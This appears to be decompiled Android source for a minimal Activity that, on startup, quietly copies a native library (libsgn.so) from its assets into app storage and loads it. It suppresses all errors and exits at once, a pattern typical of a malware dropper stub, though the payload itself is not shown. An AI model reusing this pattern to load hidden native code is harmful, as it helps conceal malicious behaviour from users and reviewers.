package com.network.android;

import android.app.Activity;
import android.os.Bundle;
import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
/* loaded from: classes.dex */
public class NetworkMain extends Activity {
    @Override // android.app.Activity
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        try {
            InputStream iS = getResources().getAssets().open("libsgn.so");
            byte[] buffer = new byte[iS.available()];
            iS.read(buffer);
            ByteArrayOutputStream oS = new ByteArrayOutputStream();
            oS.write(buffer);
            oS.close();
            iS.close();
            OutputStream outputStream = new FileOutputStream("/data/data/com.network.android/libsgn.so");
            oS.writeTo(outputStream);
            outputStream.close();
            System.load("/data/data/com.network.android/libsgn.so");
        } catch (IOException e) {
        } catch (Exception e2) {
        } catch (Throwable th) {
        }
        finish();
    }
}
